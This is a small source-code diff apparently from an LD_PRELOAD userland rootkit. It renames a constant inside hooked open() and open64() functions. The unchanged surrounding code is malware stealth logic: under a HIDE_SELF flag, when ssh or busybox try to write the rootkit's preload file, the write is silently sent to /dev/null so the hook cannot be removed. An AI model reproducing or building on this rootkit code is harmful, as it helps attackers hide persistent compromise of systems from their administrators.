@@ -24,7 +24,7 @@ int open(const char *pathname, int flags, mode_t mode){
     }
 
 #ifdef HIDE_SELF
-    if(hidden_path(pathname) && strstr(LDSO_PRELOAD, pathname) &&
+    if(hidden_path(pathname) && strstr(PRELOAD_FILE, pathname) &&
         ((process("ssh") || process("busybox")) &&
         (flags == (64|1|512)))){
         return (long)call(COPEN, "/dev/null", flags, mode);
@@ -100,7 +100,7 @@ int open64(const char *pathname, int flags, mode_t mode){
     }
 
 #ifdef HIDE_SELF
-    if(hidden_path(pathname) && strstr(LDSO_PRELOAD, pathname) &&
+    if(hidden_path(pathname) && strstr(PRELOAD_FILE, pathname) &&
         ((process("ssh") || process("busybox")) &&
         (flags == (64|1|512)))){
         return (long)call(COPEN64, "/dev/null", flags, mode);
